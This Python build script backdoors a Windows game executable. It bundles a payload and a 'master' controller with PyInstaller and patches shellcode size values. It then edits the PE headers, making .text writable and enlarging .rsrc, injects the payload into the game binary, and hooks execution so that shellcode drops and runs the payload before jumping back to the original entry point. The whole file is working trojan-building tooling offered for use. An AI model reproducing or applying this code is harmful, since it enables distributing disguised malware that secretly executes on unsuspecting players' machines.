# build script
import pefile
import shutil
import os
import math
import sys
import argparse
import subprocess

PAYLOAD_PATH = "./dist/banter.exe"

BUNDLE_DIR = "./payload/"
BUILD_DIR = "./dist/"

SHELLCODE_PATH = "./shellcode.bin"
SHELLCODE_SRC_PATH = "./shellcode.asm"
SHELLCODE_MOD_SRC_PATH = "./shellcode_mod.asm"

class Builder():

    def __init__(self, target, backdoor_loc, shellcode_loc, hook_loc):
        # Basic validation/parsing of args
        # Check if target is an exe

        # Parse addresses, both integer (22) and hex-string ('0x16') formats
        backdoor_loc = self.parse_value(backdoor_loc)
        shellcode_loc = self.parse_value(shellcode_loc)
        hook_loc = self.parse_value(hook_loc)

        self.TARGET_PATH = os.path.dirname(target)
        self.TARGET_EXE = os.path.basename(target)
        self.BUNDLE_PATH = BUNDLE_DIR + os.path.basename(self.TARGET_PATH) + os.path.altsep
        self.BUNDLE_EXE = self.BUNDLE_PATH + self.TARGET_EXE
        self.BUILD_EXE = BUILD_DIR + self.TARGET_EXE

        self.BACKDOOR_LOC = backdoor_loc
        self.SHELLCODE_LOC = shellcode_loc
        self.HOOK_LOC = hook_loc
        print(""" * Setup:\n \
         * * TARGET_PATH:   {0}\n \
         * * TARGET_EXE:    {1}\n \
         * * BUNDLE_PATH:   {2}\n \
         * * BUNDLE_EXE:    {3}\n \
         * * BUILD_EXE:     {4}\n \
         * * BACKDOOR_LOC:  {5}\n \
         * * SHELLCODE_LOC: {6}\n \
         * * HOOK_LOC:      {7}\n""".format(self.TARGET_PATH, self.TARGET_EXE, self.BUNDLE_PATH,
        self.BUNDLE_EXE, self.BUILD_EXE, hex(self.BACKDOOR_LOC), hex(self.SHELLCODE_LOC), 
        hex(self.HOOK_LOC)))
        sys.stdout.flush()

    def parse_value(self, value):
        # base 16
        if value.startswith("0x"):
            return int(value[2:],16)
        # base 10
        else: 
            return int(value)

    def bundle_payload(self):
        print(" * Bundling payload...")
        subprocess.run(['pyinstaller.exe', 'banter.py', '--log-level', 'ERROR', '--onefile', '-i', '{0}'.format(self.BUNDLE_EXE)], 
        check=True)
        print(" * Bundling master...")
        subprocess.run(['pyinstaller.exe', 'master.py', '--log-level', 'ERROR', '--onefile'], check=True)

    def obfuscate_payload(self, file_path):
        print(" * Obfuscation not yet implemented: {0}".format(file_path))
        print("")

    def fixup_shellcode(self, payload_size):
        print(" * Fixing shellcode")
        print("")
        with open(SHELLCODE_SRC_PATH, "r") as src:
            with open(SHELLCODE_MOD_SRC_PATH, 'w') as src_mod:
                line = src.readline()
                while("SIZE_FLAG" not in line):
                    src_mod.write(line)
                    line = src.readline()
                line = src.readline()
                if "push dword " in line:
                    modification = "push dword {0}\n".format(hex(payload_size))
                    print("Modifying shellcode with: '{0}'".format(modification.strip()))
                    src_mod.write(modification)
                    data = src.read(0x1000)
                    while data:
                        src_mod.write(data)
                        data = src.read(0x1000)
                else:
                    print("Could not find SIZE_FLAG, halting build!")
                    return False

        print("Compiling shellcode")
        os.system("nasm shellcode_mod.asm -f bin -o shellcode.bin")
        os.remove(SHELLCODE_MOD_SRC_PATH)
        return True

    def backdoor_target(self, payload_size, obfuscate=True):
        print(" * Backdooring target PE: {0}".format(self.BUNDLE_EXE))
        print("")

        expanded_rsrc_v_size =  payload_size + 0x1600    # Payload size + offset into resource
                                                        # 0x4CE5BB + 0x1600 = 0x4CFBBB
        # padding out to 4k
        expanded_rsrc_size = int(expanded_rsrc_v_size + 
        (1.0-(expanded_rsrc_v_size/4096-(math.floor(expanded_rsrc_v_size/4096))))*4096)
        #                       headers + .text + .data + .idata + .rsrc
        expanded_image_size = 0x1000 + 0x4000 + 0x1000 + 0x1000 + expanded_rsrc_size 
        padding_required = expanded_rsrc_size - expanded_rsrc_v_size 

        print("Embedding payload of size: {0}".format(hex(payload_size)))
        # Wipe away previous deployment
        if os.path.exists(self.BUILD_EXE):
            print("Deleting old build")
            os.remove(self.BUILD_EXE)

        target_pe = pefile.PE(self.BUNDLE_EXE)
        # Expand size in optional header
        target_pe.OPTIONAL_HEADER.SizeOfImage = expanded_image_size

        # Expand .rsrc section
        for section in target_pe.sections:
            section_dict = section.dump_dict()
            if ".text" in section_dict['Name']['Value']:
                print("Making .text section writable")
                section.Characteristics = 0xe0000020
            if ".rsrc" in section_dict['Name']['Value']:
                print("Modifying size of .rsrc section")
                # Modify:
                #   SizeOfRawData
                #   Misc_VirtualSize
                section.SizeOfRawData = expanded_rsrc_size
                section.Misc_VirtualSize = expanded_rsrc_v_size

        target_pe.write(self.BUILD_EXE)
        target_pe.close()

        # Inject PE at PE_INJECT_LOC
        # Using file as pefile doesn't let us extend past the file border
        print("Injecting PE")
        with open(self.BUILD_EXE, 'r+b') as target:
            target.seek(self.BACKDOOR_LOC)
            with open(PAYLOAD_PATH, 'rb') as payload:
                data = payload.read(0x1000)
                while data:
                    target.write(data)
                    data = payload.read(0x1000)
            # pad out with nulls
            print("Padding out with {0} nulls".format(padding_required))
            target.write(b"\x00" * padding_required)
        
        print("Hooking execution")
        original_bytes = b''
        with open(self.BUNDLE_EXE, 'r+b') as orig:
            orig.seek(self.HOOK_LOC)
            # original_bytes = orig.read(7)
            original_bytes = orig.read(8)

        with open(self.BUILD_EXE, 'r+b') as target:
            target.seek(self.HOOK_LOC)
            target.write(b'\xB8\x70\x40\x40\x00\xFF\xE0\x90')
        
        # Add shellcode to drop and execute payload
        print("Adding shellcode")
        with open(self.BUILD_EXE, 'r+b') as target:
            with open(SHELLCODE_PATH, 'rb') as shellcode:
                target.seek(self.SHELLCODE_LOC)
                data = shellcode.read(0x1000)
                while data:
                    target.write(data)
                    data = shellcode.read(0x1000)

            print("Returning execution to original entry point")
            target.write(original_bytes)
            # TODO: parameterize instead of hardcoded below
            target.write(b'\xB8\x9C\x12\x40\x00\xFF\xE0')
            # pad out end of shellcode with nops
            target.write(b"\x90" * 10)
        print("Backdoor complete")

    def obfs_xor(self, data, xor_key):
        xored_data = b''
        for byte in data:
            xored_data += (byte^xor_key).to_bytes(1,'big')
        return xored_data

    def prepare_game(self):
        # Bundle backdoored exe with game files
        print(" * Copying game at: {0}".format(self.TARGET_PATH))
        print("")
        if os.path.exists(self.BUNDLE_PATH):
            print("Deleting old bundle")
            shutil.rmtree(self.BUNDLE_PATH)
        print("Copying...")
        shutil.copytree(self.TARGET_PATH, self.BUNDLE_PATH)
        print("Done")
        sys.stdout.flush()

    def bundle_game(self):
        print(" * Bundling game at: {0}".format(self.BUNDLE_PATH))
        shutil.copy(self.BUILD_EXE, self.BUNDLE_PATH)
        print("Done")

if __name__ == "__main__":
    # Target game
    # Location to embed the binary (will be extended)
    # Location to embed shellcode (code cave)
    # Location to hook execution
    parser = argparse.ArgumentParser(description="Compile and backdoor a target game with the specified binary")
    parser.add_argument("target", type=str, help="executable target game to be backdoored")
    parser.add_argument("backdoor_loc", help="offset to empty space in the target to embed the binary, look for start of nulls in last section")
    parser.add_argument("shellcode_loc", help="offset to empty space in a section in the target which is executable. i.e. .text")
    parser.add_argument("hook_loc", help="offset to location to hook to shellcode and back.")

    args = parser.parse_args()

    builder = Builder(args.target, args.backdoor_loc, args.shellcode_loc, args.hook_loc)
    # clean/copy a fresh set of the target files
    builder.prepare_game()

    # TODO: extract this into builder for client/master, doesn't belong in this builder
    # build exe using pyinstaller
    builder.bundle_payload()
    payload_size = os.stat(PAYLOAD_PATH).st_size

    # Modify shellcode with appropriate size and compile
    # TODO: add location fixup (linked to embed location param)
    if not builder.fixup_shellcode(payload_size):
        print("Build Failed")
        sys.exit()

    # backdoor the target exe
    builder.backdoor_target(payload_size)

    builder.bundle_game()
    
    print("Build Successful")